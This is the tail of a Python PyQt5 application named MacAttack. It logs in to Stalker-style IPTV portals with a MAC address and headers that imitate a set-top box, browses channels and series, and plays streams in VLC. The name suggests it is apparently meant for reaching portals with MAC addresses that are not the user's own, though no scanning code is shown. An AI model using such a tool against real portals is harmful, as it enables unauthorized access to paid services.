            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        if tab_info["current_category"] is None:
            for item in tab_info["playlist_data"]:
                name = item["name"]
                list_item = QStandardItem(name)
                list_item.setData(item, Qt.UserRole)
                list_item.setData("category", Qt.UserRole + 1)
                self.playlist_model.appendRow(list_item)
        else:
            self.retrieve_channels(tab_name, tab_info["current_category"])

    def retrieve_channels(self, tab_name, category):
        category_type = category["category_type"]
        category_id = category.get("category_id") or category.get("genre_id")

        try:
            self.set_progress(0)

            # If a current thread is running, interrupt it and set up to start a new one
            if self.current_request_thread is not None and self.current_request_thread.isRunning():
                logging.info("RequestThread running, stopping it.")
                self.current_request_thread.requestInterruption()
                # Connect the finished signal to start a new thread once the old one is done
                self.current_request_thread.wait()  # Wait for the thread to finish
                self.current_request_thread.finished.connect(lambda: self.start_new_thread(tab_name, category_type, category_id))
                return

            # If no thread is running, start a new one directly
            self.start_new_thread(tab_name, category_type, category_id)

        except Exception as e:
            logging.error(f"Exception in retrieve_channels: {e}")
            self.error_label.setText("An error occurred while retrieving channels.")
            self.error_label.show()

    def start_new_thread(self, tab_name, category_type, category_id):
        self.request_thread = RequestThread(self.base_url, self.mac_address, category_type, category_id)
        self.request_thread.update_progress.connect(self.set_progress)
        self.request_thread.channels_loaded.connect(lambda channels: self.on_channels_loaded(tab_name, channels))
        self.request_thread.start()
        self.current_request_thread = self.request_thread
        logging.debug(f"Started RequestThread for channels in category {category_id}.")
               
    def on_channels_loaded(self, tab_name, channels):
        if self.current_request_thread != self.sender():
            logging.debug("Received channels from an old thread. Ignoring.")
            return  # Ignore signals from older threads

        tab_info = self.tab_data[tab_name]
        tab_info["current_channels"] = channels
        self.update_channel_view(tab_name)
        logging.debug(f"Channels loaded for tab {tab_name}: {len(channels)} items.")
        self.current_request_thread = None  # Reset the current thread

    def update_channel_view(self, tab_name):
        tab_info = self.tab_data[tab_name]
        self.playlist_model = tab_info["self.playlist_model"]
        self.playlist_model.clear()
        tab_info["current_view"] = "channels"

        if tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        for channel in tab_info["current_channels"]:
            channel_name = channel["name"]
            list_item = QStandardItem(channel_name)
            list_item.setData(channel, Qt.UserRole)
            item_type = channel.get("item_type", "channel")
            list_item.setData(item_type, Qt.UserRole + 1)
            self.playlist_model.appendRow(list_item)

    def on_playlist_selection_changed(self, index):
        sender = self.sender()
        current_tab = None
        for tab_name, tab_info in self.tab_data.items():
            if sender == tab_info["playlist_view"]:
                current_tab = tab_name
                break
        else:
            self.error_label.setText("Unknown sender for on_playlist_selection_changed")
            self.error_label.show()
            return

        tab_info = self.tab_data[current_tab]
        self.playlist_model = tab_info["self.playlist_model"]

        if index.isValid():
            item = self.playlist_model.itemFromIndex(index)
            item_text = item.text()

            if item_text == "Go Back":
                # Handle 'Go Back' functionality
                if tab_info["navigation_stack"]:
                    nav_state = tab_info["navigation_stack"].pop()
                    tab_info["current_category"] = nav_state["category"]
                    tab_info["current_view"] = nav_state["view"]
                    tab_info["current_series_info"] = nav_state["series_info"]  # Restore series_info
                    logging.debug(f"Go Back to view: {tab_info['current_view']}")
                    if tab_info["current_view"] == "categories":
                        self.update_playlist_view(current_tab)
                    elif tab_info["current_view"] == "channels":
                        self.update_channel_view(current_tab)
                    elif tab_info["current_view"] in ["seasons", "episodes"]:
                        self.update_series_view(current_tab)
                else:
                    logging.debug("Navigation stack is empty. Cannot go back.")
                    QMessageBox.information(
                        self, "Info", "No previous view to go back to."
                    )
            else:
                item_data = item.data(Qt.UserRole)
                item_type = item.data(Qt.UserRole + 1)
                logging.debug(f"Item data: {item_data}, item type: {item_type}")

                if item_type == "category":
                    # Navigate into a category
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info["current_series_info"],  # Preserve current_series_info
                        }
                    )
                    tab_info["current_category"] = item_data
                    logging.debug(f"Navigating to category: {item_data.get('name')}")
                    self.retrieve_channels(current_tab, tab_info["current_category"])

                elif item_type == "series":
                    # User selected a series, retrieve its seasons
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info["current_series_info"],  # Preserve current_series_info
                        }
                    )
                    tab_info["current_category"] = item_data
                    logging.debug(f"Navigating to series: {item_data.get('name')}")
                    self.retrieve_series_info(current_tab, item_data)

                elif item_type == "season":
                    # User selected a season, set navigation context
                    tab_info["navigation_stack"].append(
                        {
                            "category": tab_info["current_category"],
                            "view": tab_info["current_view"],
                            "series_info": tab_info["current_series_info"],  # Preserve current_series_info
                        }
                    )
                    tab_info["current_category"] = item_data

                    # Update view to 'seasons'
                    tab_info["current_view"] = "seasons"
                    self.update_series_view(current_tab)

                    # Retrieve episodes using the season data
                    logging.debug(
                        f"Fetching episodes for season {item_data['season_number']} in series {item_data['name']}"
                    )
                    self.retrieve_series_info(
                        current_tab,
                        item_data,
                        season_number=item_data["season_number"],
                    )

                elif item_type == "episode":
                    # User selected an episode, play it
                    logging.debug(f"Playing episode: {item_data.get('name')}")
                    self.play_channel(item_data)

                elif item_type in ["channel", "vod"]:
                    # This is an IPTV channel or VOD, play it
                    logging.debug(f"Playing channel/VOD: {item_data.get('name')}")
                    self.play_channel(item_data)

                else:
                    self.error_label.setText("Unknown item type")
                    self.error_label.show()

    def retrieve_series_info(self, tab_name, context_data, season_number=None):
        tab_info = self.tab_data[tab_name]
        try:
            session = requests.Session()
            url = self.base_url
            mac_address = self.mac_address
            token = get_token(session, url, mac_address)

            if token:
                series_id = context_data.get("id")
                if not series_id:
                    self.error_label.setText(f"Series ID missing in context data: {context_data}")
                    self.error_label.show()
                    return

                cookies = {
                    "mac": mac_address,
                    "stb_lang": "en",
                    "timezone": "Europe/London",
                }
                headers = {
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                    "Authorization": f"Bearer {token}",
                }

                if season_number is None:
                    # Fetch seasons
                    all_seasons = []
                    page_number = 0
                    seasons_url = f"{url}/portal.php?type=series&action=get_ordered_list&movie_id={series_id}&season_id=0&episode_id=0&JsHttpRequest=1-xml&p={page_number}"
                    logging.debug(
                        f"Fetching seasons URL: {seasons_url}, headers: {headers}, cookies: {cookies}"
                    )

                    while True:
                        response = session.get(
                            seasons_url, cookies=cookies, headers=headers, timeout=10
                        )
                        logging.debug(f"Seasons response: {response.text}")
                        if response.status_code == 200:
                            seasons_data = response.json().get("js", {}).get("data", [])
                            if not seasons_data:
                                break
                            for season in seasons_data:
                                season_id = season.get("id", "")
                                season_number_extracted = None
                                if season_id.startswith("season"):
                                    match = re.match(r"season(\d+)", season_id)
                                    if match:
                                        season_number_extracted = int(match.group(1))
                                    else:
                                        self.error_label.setText(f"Unexpected season id format: {season_id}")
                                        self.error_label.show()
                                else:
                                    match = re.match(r"\d+:(\d+)", season_id)
                                    if match:
                                        season_number_extracted = int(match.group(1))
                                    else:
                                        self.error_label.setText(f"Unexpected season id format: {season_id}")
                                        self.error_label.show()
  
                                season["season_number"] = season_number_extracted
                                season["item_type"] = "season"
                            all_seasons.extend(seasons_data)
                            total_items = response.json().get(
                                "js", {}
                            ).get("total_items", len(all_seasons))
                            logging.debug(
                                f"Fetched {len(all_seasons)} seasons out of {total_items}."
                            )
                            if len(all_seasons) >= total_items:
                                break
                            page_number += 1
                        else:
                            self.error_label.setText(f"Failed to fetch seasons for page {page_number} with status code {response.status_code}")
                            self.error_label.show()
  
                            break

                    if all_seasons:
                        tab_info["current_series_info"] = all_seasons
                        tab_info["current_view"] = "seasons"
                        self.update_series_view(tab_name)
                else:
                    # Fetch episodes for the given season
                    series_list = context_data.get("series", [])
                    if not series_list:
                        logging.info("No episodes found in this season.")
                        return

                    logging.debug(f"Series episodes found: {series_list}")
                    all_episodes = []
                    for episode_number in series_list:
                        episode = {
                            "id": f"{series_id}:{episode_number}",
                            "series_id": series_id,
                            "season_number": season_number,
                            "episode_number": episode_number,
                            "name": f"Episode {episode_number}",
                            "item_type": "episode",
                            "cmd": context_data.get("cmd"),
                        }
                        logging.debug(f"Episode details: {episode}")
                        all_episodes.append(episode)

                    if all_episodes:
                        tab_info["current_series_info"] = all_episodes
                        tab_info["current_view"] = "episodes"
                        self.update_series_view(tab_name)
                    else:
                        logging.info("No episodes found.")
            else:
                self.error_label.setText("Failed to retrieve token.")
                self.error_label.show()
        except KeyError as e:
            logging.error(f"KeyError retrieving series info: {str(e)}")
        except Exception as e:
            logging.error(f"Error retrieving series info: {str(e)}")

    def play_channel(self, channel):
        cmd = channel.get("cmd")
        if not cmd:
            logging.error(f"No command found for channel: {channel}")
            return
        if cmd.startswith("ffmpeg "):
            cmd = cmd[len("ffmpeg ") :]

        item_type = channel.get("item_type", "channel")

        if item_type == "channel":
            needs_create_link = False
            if "/ch/" in cmd and cmd.endswith("_"):
                needs_create_link = True

            if needs_create_link:
                try:
                    session = requests.Session()
                    url = self.base_url
                    mac_address = self.mac_address
                    token = get_token(session, url, mac_address)
                    if token:
                        cmd_encoded = quote(cmd)
                        cookies = {
                            "mac": mac_address,
                            "stb_lang": "en",
                            "timezone": "Europe/London",
                        }
                        headers = {
                            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                            "Authorization": f"Bearer {token}",
                        }
                        create_link_url = f"{url}/portal.php?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                        logging.info(f"Create link URL: {create_link_url}")
                        response = session.get(
                            create_link_url, cookies=cookies, headers=headers, timeout=10
                        )
                        response.raise_for_status()
                        json_response = response.json()
                        logging.debug(f"Create link response: {json_response}")
                        cmd_value = json_response.get("js", {}).get("cmd")
                        if cmd_value:
                            if cmd_value.startswith("ffmpeg "):
                                cmd_value = cmd_value[len("ffmpeg ") :]
                            stream_url = cmd_value
                            self.launch_videoPlayer(stream_url)
                        else:
                            self.error_label.setText("Stream URL not found in the response.")
                            self.error_label.show()
                    else:
                        self.error_label.setText("Failed to retrieve token.")
                        self.error_label.show()
                except Exception as e:
                    logging.error(f"Error creating stream link: {e}")
                    QMessageBox.critical(
                        self, "Error", f"Error creating stream link: {e}"
                    )
            else:
                self.launch_videoPlayer(cmd)

        elif item_type in ["episode", "vod"]:
            try:
                session = requests.Session()
                url = self.base_url
                mac_address = self.mac_address
                token = get_token(session, url, mac_address)
                if token:
                    cmd_encoded = quote(cmd)
                    cookies = {
                        "mac": mac_address,
                        "stb_lang": "en",
                        "timezone": "Europe/London",
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)",
                        "Authorization": f"Bearer {token}",
                    }
                    if item_type == "episode":
                        episode_number = channel.get("episode_number")
                        if episode_number is None:
                            self.error_label.setText("Episode number is missing.")
                            self.error_label.show()
                            return
                        create_link_url = f"{url}/portal.php?type=vod&action=create_link&cmd={cmd_encoded}&series={episode_number}&JsHttpRequest=1-xml"
                    else:
                        create_link_url = f"{url}/portal.php?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                    logging.debug(f"Create link URL: {create_link_url}")
                    response = session.get(
                        create_link_url, cookies=cookies, headers=headers, timeout=10
                    )
                    response.raise_for_status()
                    json_response = response.json()
                    logging.debug(f"Create link response: {json_response}")
                    cmd_value = json_response.get("js", {}).get("cmd")
                    if cmd_value:
                        if cmd_value.startswith("ffmpeg "):
                            cmd_value = cmd_value[len("ffmpeg ") :]
                        stream_url = cmd_value
                        self.launch_videoPlayer(stream_url)
                    else:
                        self.error_label.setText("Stream URL not found in the response.")
                        self.error_label.show()
                else:
                    self.error_label.setText("Failed to retrieve token.")
                    self.error_label.show()
            except Exception as e:
                logging.error(f"Error creating stream link: {e}")
                QMessageBox.critical(
                    self, "Error", f"Error creating stream link: {e}"
                )
        else:
            logging.error(f"Unknown item type: {item_type}")
            QMessageBox.critical(
                self, "Error", f"Unknown item type: {item_type}"
            )

    def update_series_view(self, tab_name):
        tab_info = self.tab_data[tab_name]
        self.playlist_model = tab_info["self.playlist_model"]
        self.playlist_model.clear()

        if tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            self.playlist_model.appendRow(go_back_item)

        for item in tab_info["current_series_info"]:
            item_type = item.get("item_type")
            if item_type == "season":
                name = f"Season {item['season_number']}"
            elif item_type == "episode":
                name = f"Episode {item['episode_number']}"
            else:
                name = item.get("name") or item.get("title")
            list_item = QStandardItem(name)
            list_item.setData(item, Qt.UserRole)
            list_item.setData(item_type, Qt.UserRole + 1)
            self.playlist_model.appendRow(list_item)

    def launch_videoPlayer(self, stream_url):
        self.error_label.hide()
        logging.debug(f"Launching media player with URL: {stream_url}")
        
        # Stop the media player if it's already playing
        if self.videoPlayer.is_playing():
            self.videoPlayer.stop()

        # Clear any previous media
        self.videoPlayer.set_media(None)

        # Create new media for the new stream URL
        media = self.instance.media_new(stream_url)
        self.videoPlayer.set_media(media)

        # Play the new stream
        self.videoPlayer.play()

        # Function to check for errors after a delay
        def delayed_error_check():
            if not self.videoPlayer.is_playing():
                self.on_player_error(None)  # Trigger the error handler manually

        # Use QTimer for delayed error check on the main thread
        QTimer.singleShot(8000, delayed_error_check)

    def on_player_error(self, event):
        self.error_label.hide()
        """Handle VLC errors."""
        self.error_label.setText("ERROR: Can't load the stream.")
        self.error_label.show()   
        
    def mousePressEvent(self, event):
        # This method is triggered on mouse click
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:  # Only respond to left-clicks
                if self.videoPlayer.is_playing():  # Check if the video is currently playing
                    self.videoPlayer.pause()  # Pause the video
                else:
                    self.videoPlayer.play()  # Play the video

    def mouseDoubleClickEvent(self, event):
        
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:
                if self.windowState() == Qt.WindowNoState:
                    # Hide all widgets in left_layout, including hostname and MAC inputs
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.hide()
                    # Hide all widgets in hostname_layout
                    for i in range(self.hostname_layout.count()):
                        widget = self.hostname_layout.itemAt(i).widget()
                        if widget:
                            widget.hide()
                    # Hide all widgets in mac_layout
                    for i in range(self.mac_layout.count()):
                        widget = self.mac_layout.itemAt(i).widget()
                        if widget:
                            widget.hide()

                    self.showFullScreen()
                    # Move video_frame to top-left corner on double click
                    self.video_frame.move(0, 0)  # Move the video frame to (0, 0) top-left corner

                    # Ensure no layout padding or spacing
                    self.left_layout.setContentsMargins(0, 0, 0, 0)  # Remove padding around the left layout
                    self.left_layout.setSpacing(0)  # No space between widgets
                    self.videoPlayer.play()  # Play the video
                    self.tabs.tabBar().setVisible(False)

                else:
                    # Restore window state to normal
                    self.showNormal()  # Restore to normal window state

                    # Restore the layout and widgets visibility
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.show()
                    for i in range(self.hostname_layout.count()):
                        widget = self.hostname_layout.itemAt(i).widget()
                        if widget:
                            widget.show()
                    for i in range(self.mac_layout.count()):
                        widget = self.mac_layout.itemAt(i).widget()
                        if widget:
                            widget.show()

                    self.left_layout.setContentsMargins(10, 0, 10, 10)
                    self.left_layout.setSpacing(5)  # Adjust spacing if necessary
                    self.error_label.hide()   
                    self.videoPlayer.play()  # Play the video
                    self.tabs.tabBar().setVisible(True)
    
    def resizeEvent(self, event):
        # Calculate new width with a minimum constraint to prevent zero or negative sizes
        new_width = max(self.width() - 290, 300)  # keeping the playlist side @ 360, and make the window no smaller than 370
        # Set the new minimum width for the video frame
        self.video_frame.setMinimumWidth(new_width)
  
    
    def closeEvent(self, event):
        # Save settings when the window is about to close
        self.save_settings()

        # Accept the close event
        event.accept()
            
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MacAttack()
    window.show()
    sys.exit(app.exec_())